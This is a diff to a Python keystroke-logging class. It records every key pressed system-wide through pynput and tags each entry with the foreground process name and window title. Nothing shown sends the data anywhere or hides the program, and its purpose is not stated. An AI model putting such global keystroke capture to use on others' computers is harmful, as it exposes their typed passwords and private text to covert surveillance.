@@ -1,14 +1,15 @@
 import threading
 from pynput import keyboard 
 import time
-from processlogger import ProcessLog
-import json
-from copy import deepcopy
+import psutil
+import win32gui
+import win32process
+
+
 
 class KeyLog():
     def __init__(self):
 
-        self.process = ProcessLog()   #NOTE: Declared in init so that theres a single instance of the class
         self.buffer = []
         self.last = None
 
@@ -18,7 +19,7 @@ class KeyLog():
         except AttributeError:
             char = str(key)
 
-        current_process = self.process.current()
+        current_process = self._current()
                 
         if current_process is None:
             return None
@@ -35,6 +36,21 @@ class KeyLog():
             })
 
         self.buffer[-1]["keys"].append(char)
+    
+    def _current(self):
+        hwnd = win32gui.GetForegroundWindow()
+
+        if not hwnd:
+            return None
+
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+
+        try:
+            name = psutil.Process(pid).name()
+        except psutil.Error:
+            name = f"<pid {pid}"
+
+        return name, win32gui.GetWindowText(hwnd) 
 
     def start(self):
         self.listener = keyboard.Listener(on_press=self._log)
